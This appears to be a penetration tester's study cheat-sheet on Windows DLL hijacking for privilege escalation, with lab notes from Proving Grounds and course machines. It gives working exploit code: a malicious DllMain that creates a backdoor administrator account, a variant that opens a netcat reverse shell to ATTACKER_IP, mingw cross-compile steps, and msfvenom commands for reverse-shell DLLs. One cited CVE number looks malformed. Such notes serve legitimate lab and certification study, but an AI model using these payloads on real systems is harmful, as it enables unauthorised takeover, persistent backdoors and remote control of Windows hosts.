# DLL Hijacking

Back to [[Windows-PrivEsc-Methodology]]

## Find Missing DLLs

1. Process Monitor (if accessible) -- filter for "NAME NOT FOUND" on .dll
2. WinPEAS highlights DLL hijacking opportunities
3. Check service executable directories for write access:
```cmd
icacls "C:\path\to\service\directory"
```

## DLL Search Order (for services)

1. Application directory
2. System directory (`C:\Windows\System32`)
3. Windows directory (`C:\Windows`)
4. Current directory
5. PATH directories

## Exploit

Malicious DLL source -- save as `hijack.c` on Kali:
```c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add");
    }
    return TRUE;
}
```

Reverse shell variant:
```c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c C:\\tmp\\nc.exe ATTACKER_IP 443 -e cmd.exe");
    }
    return TRUE;
}
```

Cross-compile on Kali:
```bash
x86_64-w64-mingw32-gcc hijack.c -shared -o hijack.dll
```

Place `hijack.dll` (renamed to the missing DLL name) in a writable directory in the search path, then restart the service.

---

## From Your Boxes

> **Jacko** (PG) — FJTWSVIC service (PaperStream IP) had DLL hijack vulnerability (CVE-49382)
> - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f dll -a x86 --platform windows -o UninOldIs.dll`, then ran PowerShell exploit to place DLL and restart service
> - Lesson: Search exploit-db for known DLL hijack CVEs for installed software. The exploit script handles placement and restart.

> **Access** (PG) — SeManageVolumePrivilege allowed modifying system DLL directories, hijacked tzres.dll
> - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=53 -f dll -o tzres.dll`, placed in C:\Windows\System32\wbem\, then ran `systeminfo` to trigger load
> - Lesson: tzres.dll loads when you run systeminfo. Useful when you have write access to system directories.

> **Relia Host 248** (Course) — BetaMonitor service logging "Couldn't find BetaLibrary.Dll"
> - What worked: Identified missing DLL from log file, checked PATH order for writable directory, compiled malicious DLL with mingw: `x86_64-w64-mingw32-gcc myDLL.cpp --shared -o BetaLibrary.dll`
> - Lesson: Check application log files for "DLL not found" messages. The PATH search order determines where to place your payload.

> **Medtech CLIENT02** (Course) — WinPEAS flagged "Possible DLL Hijacking in binary folder: C:\DevelopmentExecutables"
> - What worked: Everyone [AllAccess] on the folder allowed dropping a malicious DLL
> - Lesson: WinPEAS explicitly flags DLL hijack opportunities with permission info. Trust its output.
